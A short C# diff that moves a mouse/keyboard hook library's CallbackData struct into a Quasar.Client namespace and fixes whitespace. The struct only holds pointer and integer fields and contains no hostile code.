@@ -4,7 +4,7 @@
 
 using System;
 
-namespace Gma.System.MouseKeyHook.WinApi
+namespace Quasar.Client.MouseKeyHook.WinApi
 {
     internal struct CallbackData
     {
@@ -19,6 +19,6 @@ namespace Gma.System.MouseKeyHook.WinApi
 
         public IntPtr LParam { get; }
 
-        public int MSwapButton{ get; set; }
+        public int MSwapButton { get; set; }
     }
 }
